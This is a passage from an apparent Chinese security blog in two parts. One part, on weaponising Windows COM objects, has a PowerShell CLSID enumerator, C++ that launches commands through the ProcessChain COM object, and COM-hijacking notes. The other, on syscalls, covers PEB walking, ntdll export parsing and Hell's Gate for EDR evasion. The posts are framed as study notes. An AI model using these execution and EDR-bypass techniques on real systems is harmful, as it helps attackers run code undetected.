<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Position</span>  = <span class="number">1</span></span><br><span class="line"><span class="variable">$Filename</span> = <span class="string">&quot;win10-clsid-members.txt&quot;</span></span><br><span class="line"><span class="variable">$inputFilename</span> = <span class="string">&quot;clsids.txt&quot;</span></span><br><span class="line"><span class="keyword">ForEach</span>(<span class="variable">$CLSID</span> <span class="keyword">in</span> <span class="built_in">Get-Content</span> <span class="variable">$inputFilename</span>) &#123;</span><br><span class="line">      <span class="built_in">Write-Output</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$Position</span>) - <span class="variable">$</span>(<span class="variable">$CLSID</span>)&quot;</span></span><br><span class="line">      <span class="built_in">Write-Output</span> <span class="string">&quot;------------------------&quot;</span> | <span class="built_in">Out-File</span> <span class="variable">$Filename</span> <span class="literal">-Append</span></span><br><span class="line">      <span class="built_in">Write-Output</span> <span class="variable">$</span>(<span class="variable">$CLSID</span>) | <span class="built_in">Out-File</span> <span class="variable">$Filename</span> <span class="literal">-Append</span></span><br><span class="line">      <span class="variable">$handle</span> = [<span class="type">activator</span>]::CreateInstance([<span class="type">type</span>]::GetTypeFromCLSID(<span class="variable">$CLSID</span>))</span><br><span class="line">      <span class="variable">$handle</span> | <span class="built_in">Get-Member</span> | <span class="built_in">Out-File</span> <span class="variable">$Filename</span> <span class="literal">-Append</span></span><br><span class="line">      <span class="variable">$Position</span> += <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111135353305.png" alt="image-20221111135353305"></p>
<p>找关键词 <code>execute</code>,<code>exec</code>,<code>spawn</code>,<code>launch</code>,<code>run</code><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111135506972.png" alt="image-20221111135506972"></p>
<p>接着进行相应的传参调用即可，类似shellWindows、mmc等</p>
<h5 id="processChain的利用"><a href="#processChain的利用" class="headerlink" title="processChain的利用"></a>processChain的利用</h5><p>实现是prchauto.dll，其中包含 tlib文件，可以用oleview打开</p>
<p>在注册表中找到该com组件的实现文件</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221105124230752.png" alt="image-20221105124230752"></p>
<p>查看方法，看到接受commandLine方法，说明可能存在利用</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221109225144671.png" alt="image-20221109225144671"></p>
<p>去oleview中查看对应的tlb中包含的成员等信息</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221105131827386.png" alt="image-20221105131827386"></p>
<p>将这个tlib文件保存到idl文件，然后使用MIDL将IDL文件转换成需要的c++头文件，头文件中会定义这个类和接口的使用方法。</p>
<p>补充一下：idl是一种接口定义语言，idl文件是接口定义文件，包含接口和类型库定义，MIDL是IDL文件的编译器</p>
<p>接下来编译idl，最开始的时候配置命令行版本的midl，但是老是报错，后面发现可以直接在vs里编译</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221107011930018.png" alt="image-20221107011930018"></p>
<p>可以查看midl的输出</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221107011949977.png" alt="image-20221107011949977"></p>
<p>编译后生成h文件和c文件</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221107012035149.png" alt="image-20221107012035149"></p>
<p>我们需要根据头文件来自己编程实现com组件的利用</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221107012122798.png" alt="image-20221107012122798"></p>
<p>main.cpp</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CLSID_ProcessChain <span class="meta-string">L&quot;&#123;E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E&#125;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IID_IProcessChain  <span class="meta-string">L&quot;&#123;79ED9CB4-3A01-4ABA-AD3C-A985EE298B20&#125;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ProcessChain</span><span class="params">(<span class="keyword">wchar_t</span> cmd[])</span> </span>&#123;</span><br><span class="line">	HRESULT hr = <span class="number">0</span>;</span><br><span class="line">	CLSID clsidIProcessChain = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	IID iidIProcessChain = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	IProcessChain* ProcessChain = <span class="literal">NULL</span>;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化com环境</span></span><br><span class="line">	<span class="built_in">CoInitialize</span>(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CLSIDFromString</span>(CLSID_ProcessChain, &amp;clsidIProcessChain);</span><br><span class="line">	<span class="built_in">IIDFromString</span>(IID_IProcessChain, &amp;iidIProcessChain);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建com接口</span></span><br><span class="line">	hr = <span class="built_in">CoCreateInstance</span>(clsidIProcessChain, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, iidIProcessChain, (LPVOID*)&amp;ProcessChain);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//设置布尔值供start接受参数</span></span><br><span class="line">	VARIANT_BOOL vb = VARIANT_TRUE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置参数</span></span><br><span class="line">	ProcessChain-&gt;<span class="built_in">put_CommandLine</span>((BSTR)cmd);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用方法</span></span><br><span class="line">	hr = ProcessChain-&gt;<span class="built_in">Start</span>(&amp;vb);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Load successfully!&quot;</span>);</span><br><span class="line">	<span class="comment">//释放</span></span><br><span class="line">	<span class="built_in">CoUninitialize</span>();</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="未公开的com对象"><a href="#未公开的com对象" class="headerlink" title="未公开的com对象"></a>未公开的com对象</h3><p>需要利用一些逆向手段，和白加黑的挖掘比较相似(ps：以下方式仅仅是对这种方式的复现，并未去挖掘新的com利用)</p>
<p>那么，如果看不到它的方法或者参数怎么办呢？这个时候就需要我们去逆向</p>
<p>在oleview里找到该方法调用的参数</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221109231930765.png" alt="image-20221109231930765"></p>
<p>这种情况我们还无法确定是否可以创建其他进程</p>
<p>在ida里发现该dll确实调用了CreateProcess，虽然没有找到具体是哪个方法调用的，但基本可以确定该com对象是可以执行命令创建进程的，上文的利用也是印证了这一点</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221109233856111.png" alt="image-20221109233856111"></p>
<h3 id="自动化挖掘"><a href="#自动化挖掘" class="headerlink" title="自动化挖掘"></a>自动化挖掘</h3><p>诚然，纯手工挖掘com组件是很耗时的一件事情，下面介绍自动化挖掘com的方法</p>
<p>项目地址</p>
<p><a href="https://github.com/nickvourd/COM-Hunter">https://github.com/nickvourd/COM-Hunter</a></p>
<p>大致介绍</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111112209384.png" alt="image-20221111112209384"></p>
<h5 id="com劫持-1"><a href="#com劫持-1" class="headerlink" title="com劫持"></a>com劫持</h5><p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111113030674.png" alt="image-20221111113030674"></p>
<p>发现是oleacc.dll</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111113151925.png" alt="image-20221111113151925"></p>
<p>修改后启动ie浏览器，劫持成功</p>
<p><img src="/2022/11/25/com%E6%AD%A6%E5%99%A8%E5%8C%96/image-20221111113426921.png" alt="image-20221111113426921"></p>
<p>这种方式是不是比上面手动挖掘方便多了呢？但是也有缺点，找到的com并不完整，更深入的挖掘还是需要依靠手工</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>com可以挖掘利用的点还有很多，浏览器、office等等各种功能都曾被挖掘出利用，现在已经成为对抗中的热门领域，非常值得深度研究，包括劫持横向提权等等……</p>
<p>本文也只是记录个人在学习com从0-1的过程，如果有理解错误的地方，欢迎大家指正</p>
<p>参考文章</p>
<p><a href="https://422926799.github.io/posts/73b20b1d.html">https://422926799.github.io/posts/73b20b1d.html</a></p>
<p><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/">https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/</a></p>
<p><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</a> </p>
<p><a href="https://github.com/rvrsh3ll/SharpCOM/blob/master/SharpCOM/Program.cs">https://github.com/rvrsh3ll/SharpCOM/blob/master/SharpCOM/Program.cs</a></p>
<p><a href="https://paper.seebug.org/1624/">https://paper.seebug.org/1624/</a></p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/taskschd/logon-trigger-example--c---">https://learn.microsoft.com/en-us/windows/win32/taskschd/logon-trigger-example--c---</a></p>
<p><a href="http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html">http://www.zcgonvh.com/post/Advanced_Windows_Task_Scheduler_Playbook-Part.1_basic.html</a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag> windows</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>syscall的前世今生</title>
    <url>/2022/03/14/syscall/</url>
    <content><![CDATA[<p>本文首发于跳跳糖社区，原文链接：<a href="https://tttang.com/archive/1464/">https://tttang.com/archive/1464/</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学免杀不可避免的学习syscall，虽然是几年前的技术，还是有必要学习。学习新技术之前先掌握旧技术。</p>
<h2 id="PEB-Process-Envirorment-Block-Structure"><a href="#PEB-Process-Envirorment-Block-Structure" class="headerlink" title="PEB(Process Envirorment Block Structure)"></a>PEB(Process Envirorment Block Structure)</h2><p>进程环境信息块，是一个从内核中分配给每个进程的用户模式结构,每一个进程都会有从ring0分配给该进程的进程环境块，后续我们主要需要了解<code>_PEB_LDR_DATA</code>以及其他子结构</p>
<p>这张图是x86系统的结构体</p>
<p><img src="https://md.buptmerak.cn/uploads/upload_fbae1ed22b607a3f19ca525422d55b97.png" alt="img"></p>
<p>FS段寄存器指向当前的TEB结构，可以看到PEB在TEB的0x30偏移处</p>
<p>微软并没有定义PEB结构，因此需要我们自定义</p>
<p>PEB的结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">	BOOLEAN InheritedAddressSpace;</span><br><span class="line">	BOOLEAN ReadImageFileExecOptions;</span><br><span class="line">	BOOLEAN BeingDebugged;</span><br><span class="line">	BOOLEAN Spare;</span><br><span class="line">	HANDLE Mutant;</span><br><span class="line">	PVOID ImageBase;</span><br><span class="line">	PPEB_LDR_DATA LoaderData;</span><br><span class="line">	PVOID ProcessParameters;</span><br><span class="line">	PVOID SubSystemData;</span><br><span class="line">	PVOID ProcessHeap;</span><br><span class="line">	PVOID FastPebLock;</span><br><span class="line">	PVOID FastPebLockRoutine;</span><br><span class="line">	PVOID FastPebUnlockRoutine;</span><br><span class="line">	ULONG EnvironmentUpdateCount;</span><br><span class="line">	PVOID* KernelCallbackTable;</span><br><span class="line">	PVOID EventLogSection;</span><br><span class="line">	PVOID EventLog;</span><br><span class="line">	PVOID FreeList;</span><br><span class="line">	ULONG TlsExpansionCounter;</span><br><span class="line">	PVOID TlsBitmap;</span><br><span class="line">	ULONG TlsBitmapBits[<span class="number">0x2</span>];</span><br><span class="line">	PVOID ReadOnlySharedMemoryBase;</span><br><span class="line">	PVOID ReadOnlySharedMemoryHeap;</span><br><span class="line">	PVOID* ReadOnlyStaticServerData;</span><br><span class="line">	PVOID AnsiCodePageData;</span><br><span class="line">	PVOID OemCodePageData;</span><br><span class="line">	PVOID UnicodeCaseTableData;</span><br><span class="line">	ULONG NumberOfProcessors;</span><br><span class="line">	ULONG NtGlobalFlag;</span><br><span class="line">	BYTE Spare2[<span class="number">0x4</span>];</span><br><span class="line">	LARGE_INTEGER CriticalSectionTimeout;</span><br><span class="line">	ULONG HeapSegmentReserve;</span><br><span class="line">	ULONG HeapSegmentCommit;</span><br><span class="line">	ULONG HeapDeCommitTotalFreeThreshold;</span><br><span class="line">	ULONG HeapDeCommitFreeBlockThreshold;</span><br><span class="line">	ULONG NumberOfHeaps;</span><br><span class="line">	ULONG MaximumNumberOfHeaps;</span><br><span class="line">	PVOID** ProcessHeaps;</span><br><span class="line">	PVOID GdiSharedHandleTable;</span><br><span class="line">	PVOID ProcessStarterHelper;</span><br><span class="line">	PVOID GdiDCAttributeList;</span><br><span class="line">	PVOID LoaderLock;</span><br><span class="line">	ULONG OSMajorVersion;</span><br><span class="line">	ULONG OSMinorVersion;</span><br><span class="line">	ULONG OSBuildNumber;</span><br><span class="line">	ULONG OSPlatformId;</span><br><span class="line">	ULONG ImageSubSystem;</span><br><span class="line">	ULONG ImageSubSystemMajorVersion;</span><br><span class="line">	ULONG ImageSubSystemMinorVersion;</span><br><span class="line">	ULONG GdiHandleBuffer[<span class="number">0x22</span>];</span><br><span class="line">	ULONG PostProcessInitRoutine;</span><br><span class="line">	ULONG TlsExpansionBitmap;</span><br><span class="line">	BYTE TlsExpansionBitmapBits[<span class="number">0x80</span>];</span><br><span class="line">	ULONG SessionId;</span><br><span class="line">&#125; PEB, * PPEB;</span><br></pre></td></tr></table></figure>

<p>在PEB中的0x0c处为一指针，指向<code>PEB_LDR_DATA</code>结构，该结构体包含有关为进程加载的模块的信息（存储着该进程所有模块数据的链表）。</p>
<p>在<code>PEB_LDR_DATA</code>的0x0c,0x14,0x1c中为三个双向链表<code>LIST_ENTRY</code>，在<code>struct _LDR_MODULE</code>的0x00,0x08和0x10处是三个对应的同名称的<code>LIST_ENTRY</code>, <code>PEB_LDR_DATA</code>和<code>struct _LDR_MODULE</code>就是通过这三个LIST_ENTRY对应连接起来的。</p>
<p>三个双向链表分别代表<strong>模块加载顺序，模块在内存中的加载顺序以及模块初始化装载的顺序</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">	ULONG Length;</span><br><span class="line">	ULONG Initialized;</span><br><span class="line">	PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, * PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure>

<p>双向链表 <code>LIST_ENTRY</code>的定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>

<p>每个双向链表都是指向进程装载的模块，结构中的每个指针，指向了一个<code>LDR_DATA_TABLE_ENTRY</code>的结构:</p>
<p>这个结构很重要，提供了内存模块的基址和dll名称</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_MODULE</span> &#123;</span></span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">	PVOID BaseAddress;</span><br><span class="line">	PVOID EntryPoint;</span><br><span class="line">	ULONG SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName;</span><br><span class="line">	ULONG Flags;</span><br><span class="line">	SHORT LoadCount;</span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	LIST_ENTRY HashTableEntry;</span><br><span class="line">	ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_MODULE, * PLDR_MODULE;</span><br></pre></td></tr></table></figure>



<p>微软给出了如何检索PEB得到偏移地址  32位和64位</p>
<p><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170&viewFallbackFrom=vs-2019">__readgsbyte, __readgsdword, __readgsqword, __readgsword | Microsoft Docs</a></p>
<p><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170&viewFallbackFrom=vs-2019">__readfsbyte, __readfsdword, __readfsqword, __readfsword | Microsoft Docs</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08WxW0FWklBjAqyXuqWWcicfxP1dL1MCNs5nxYZGiaGERwCbaKaUs5BvFKOgHibZ5xbZXyHicXOFHbqibyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><h5 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h5><p>Windows下有两种处理器访问模式：用户模式（user mode）和内核模式（kernel mode）。用户模式下运行应用程序时，Windows 会为该程序创建一个新进程，提供一个私有虚拟地址空间和一个私有句柄表，因为私有，一个应用程序无法修改另一个应用程序的私有虚拟地址空间的数据；内核模式下，所有运行的代码都共享一个虚拟地址空间， 因此内核中驱动程序可能还会因为写入错误的地址空间导致其他驱动程序甚至系统出现错误。</p>
<p>内核中包含了大部分操作系统的内部数据结构，所以用户模式下的应用程序在访问这些数据结构或调用内部Windows例程以执行特权操作的时候，必须先从用户模式切换到内核模式，这里就涉及到系统调用。</p>
<p>x86 windows 使用 sysenter 实现系统调用。</p>
<p>x64 windows 使用 <strong>syscall</strong> 实现系统调用。</p>
<p>目前syscall已经成为了绕过AV/EDR所使用的主流方式，可以用它绕过一些敏感函数的调用监控(R3)。主流的AV/EDR都会对敏感函数进行HOOK，而syscall则可以用来绕过该类检测。</p>
<p>不同操作系统版本之间syscall number不同。可以参考<a href="https://j00ru.vexillium.org/syscalls/nt/64/">https://j00ru.vexillium.org/syscalls/nt/64/</a> </p>
<p>使用syscall的前提：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用GetModuleHandle找到ntdll的基址 </span><br><span class="line">解析DLL的导出表 </span><br><span class="line">查找syscall number </span><br><span class="line">执行syscall</span><br></pre></td></tr></table></figure>

<h5 id="ntdll"><a href="#ntdll" class="headerlink" title="ntdll"></a>ntdll</h5><p>该网站解析了ntdll.dll的pe</p>
<p><a href="http://undocumented.ntinternals.net/">http://undocumented.ntinternals.net/</a></p>
<p>在win10中，除了minimal和pico进程外，所有用户态的进程默认情况下都隐式链接到ntdll.dll</p>
<p>一般情况下，ntdll.dll在内存中的第二个模块,kernel32.dll是第三个模块。然而有些杀软会改变内存中的模块顺序列表，因此我们需要先确定指向的内存模块是ntdll.dll。如果访问了错误的模块，很显然不会加载任何功能。</p>
<p>可以简单的看几个ntdll.dll中的函数。注意到他们的调用.后面讲到地狱之门的时候会谈到这个调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov 	r10,rcx</span><br><span class="line">mov 	eax,xxh</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>看几个ntdll.dll中的函数了解syscall的调用，如上文一样</p>
<p><strong>ntCreateThread</strong></p>
<p><img src="/2022/03/14/syscall/image-20220302172656771.png" alt="image-20220302172656771"></p>
<p><strong>ntCreateProcess</strong></p>
<p><img src="/2022/03/14/syscall/image-20220302172726585.png" alt="image-20220302172726585"></p>
<p><strong>ntAllocateVirtualMemory</strong></p>
<p><img src="/2022/03/14/syscall/image-20220302172844674.png" alt="image-20220302172844674"></p>
<p>可以看到NT函数的调用都差不多，差别就在传入 eax 寄存器的值不同，这里存储的是系统调用号，基于 eax 所存储的值的不同，syscall 进入内核调用的内核函数也不同。</p>
<h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><p>我们可以用代码来解析ntdll</p>
<p>首先获取内存模块的基地址</p>
<p><img src="/2022/03/14/syscall/image-20220303162154007.png" alt="image-20220303162154007"></p>
<p>我们的目标是获得模块导出地址表。步骤如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.找到模块基地址 </span><br><span class="line">2.获取 IMAGE_DOS_HEADER 并检查 IMAGE_DOS_SIGNATURE 来验证dos头</span><br><span class="line">3.遍历 IMAGE_NT_HEADER  , IMAGE_FILE_HEADER , IMAGE_OPTIONAL_HEADER</span><br><span class="line">4.在IMAGE_OPTIONAL_HEADER中找到导出地址表，它在 IMAGE_DATA_DIRECTORY 中,我们将他类型转换为IMAGE_EXPORT_DIRECTORY </span><br></pre></td></tr></table></figure>

<p>代码实现，参考cripsr师傅</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PBYTE ImageBase;</span><br><span class="line">    PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PLDR_MODULE pLoadModule;</span><br><span class="line">    pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink - <span class="number">0x10</span>);</span><br><span class="line">    ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line">    Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    <span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">    File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line">    Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">    ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br></pre></td></tr></table></figure>

<p>当我们得到<code>NT_Header</code>时,由于PE头文件的数据结构已经给出，其前四个字节为一个DWORD类型的<code>Signature</code>，因此加上这四个字节就会得到<code>FileHeader</code>，然后在此基础上加上FileHeader数据结构所占大小最终得到<code>Optional</code>，只需要将其类型转为<code>_IMAGE_EXPORT_DIRECTORY</code>就得到了我们的导出地址表,再通过:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.FunctionNameAddressArray 一个包含函数名称的数组</span><br><span class="line">2.FunctionOrdinalAddressArray 充当函数寻址数组的索引</span><br><span class="line">3.FunctionAddressArray 一个包含函数地址的数组</span><br></pre></td></tr></table></figure>



<p>得到ntdll的导出函数及地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetPeHeader</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PBYTE ImageBase;</span><br><span class="line">    PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">    PLDR_MODULE pLoadModule;</span><br><span class="line">    <span class="comment">// NTDLL</span></span><br><span class="line">    pLoadModule = (PLDR_MODULE)((PBYTE)Peb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">    ImageBase = (PBYTE)pLoadModule-&gt;BaseAddress;</span><br><span class="line"> </span><br><span class="line">    Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    <span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos-&gt;e_lfanew);</span><br><span class="line">    File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD)));</span><br><span class="line">    Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">    ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"> </span><br><span class="line">    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNames);</span><br><span class="line">    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt; AddressOfNameOrdinals);</span><br><span class="line">    <span class="keyword">for</span> (WORD cx = <span class="number">0</span>; cx &lt; ExportTable-&gt;NumberOfNames; cx++) </span><br><span class="line">    &#123;</span><br><span class="line">        PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);</span><br><span class="line">        PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\tFunction Address:%p\n&quot;</span>, pczFunctionName, pFunctionAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/03/14/syscall/image-20220303165921255.png" alt="image-20220303165921255"></p>
<h2 id="syscall项目"><a href="#syscall项目" class="headerlink" title="syscall项目"></a>syscall项目</h2><p>为什么有地狱之门</p>
<p>在创建R3进程的时候，EDR会hook用户层的相关windows API调用，从而完成对进程动态行为的监控。比如，hook VirtualAlloc，监控内存分配。hook CreateProcess，监控进程创建。可以在用户层完成hook，也可以在内核层hook。用户层hook的好处是对性能的影响较小，相对于内核层hook更稳定，不容易导致系统蓝屏，所以很多EDR会选择在用户层hook，同时在内核层使用回调监控重要的内核api调用。一个进程分配了RWX属性的内存，或者修改了内存属性，将RW的内存修改为了RWX，由于RWX内存属性是shellcode或反射型DLL加载所用的内存属性，因此EDR会对申请的内存进行扫描，匹配到恶意软件的yara规则后，将会杀死恶意进程，并向控制中心发送告警。</p>
<p>因此地狱之门出现了，为了避免在用户层被EDR hook的敏感函数检测到敏感行为，利用从ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。主要来应对 EDR 对 Ring3 API 的 HOOK，不同版本的 Windows Ntxxx 函数的系统调用号不同，且调用时需要逆向各 API 的结构方便调用。</p>
<p>网上也出了几个项目</p>
<h5 id="Hell’s-Gate：地狱之门"><a href="#Hell’s-Gate：地狱之门" class="headerlink" title="Hell’s Gate：地狱之门"></a>Hell’s Gate：地狱之门</h5><p><a href="https://github.com/am0nsec/HellsGate/">https://github.com/am0nsec/HellsGate/</a></p>
<p>原理：通过直接读取进程第二个导入模块即NtDLL，解析结构然后遍历导出表，根据函数名Hash找到函数地址，将这个函数读取出来通过<code>0xb8</code>这个操作码来动态获取对应的系统调用号，从而绕过内存监控，在自己程序中执行了NTDLL的导出函数而不是直接通过<code>LoadLibrary</code>然后<code>GetProcAddress</code></p>
<p>其中生成的宏汇编代码(MASM)来定义执行通过系统调用号调用NT函数的函数</p>
